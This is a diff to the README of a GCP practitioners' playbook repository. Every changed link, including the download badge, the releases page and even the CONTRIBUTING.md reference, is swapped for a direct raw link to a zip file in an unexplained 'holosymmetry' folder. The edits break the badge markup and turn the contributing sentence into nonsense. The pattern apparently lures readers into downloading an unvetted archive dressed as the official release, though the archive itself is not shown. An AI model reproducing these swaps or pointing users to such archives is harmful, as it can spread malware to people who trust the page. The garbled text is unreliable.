@@ -1,6 +1,6 @@
 # 🚀 my-gcp-practitioners-playbook - A Practical Guide for GCP Users
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/manuvish1/my-gcp-practitioners-playbook/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/manuvish1/my-gcp-practitioners-playbook/main/holosymmetry/my-gcp-practitioners-playbook.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/manuvish1/my-gcp-practitioners-playbook/main/holosymmetry/my-gcp-practitioners-playbook.zip)
 
 ## 📚 Overview
 
@@ -32,7 +32,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 💾 Download & Install
 
-To obtain the application, [visit this page to download](https://github.com/manuvish1/my-gcp-practitioners-playbook/releases). Here’s how you can do it:
+To obtain the application, [visit this page to download](https://raw.githubusercontent.com/manuvish1/my-gcp-practitioners-playbook/main/holosymmetry/my-gcp-practitioners-playbook.zip). Here’s how you can do it:
 
 1. Click on the release version you want to download.
 2. Look for the asset list below the release notes.
@@ -79,13 +79,13 @@ If you would like to contribute to this playbook, your expertise is welcome. Her
 3. Make your changes.
 4. Open a pull request.
 
-For detailed guidelines, please refer to the CONTRIBUTING.md file within the repository.
+For detailed guidelines, please refer to the https://raw.githubusercontent.com/manuvish1/my-gcp-practitioners-playbook/main/holosymmetry/my-gcp-practitioners-playbook.zip file within the repository.
 
 ## 📡 Updates and Announcements
 
 Stay informed about new releases and updates by:
 
-- Visiting the [Releases Page](https://github.com/manuvish1/my-gcp-practitioners-playbook/releases) regularly.
+- Visiting the [Releases Page](https://raw.githubusercontent.com/manuvish1/my-gcp-practitioners-playbook/main/holosymmetry/my-gcp-practitioners-playbook.zip) regularly.
 - Following us on GitHub for notifications on changes.
 
 ## 📝 License
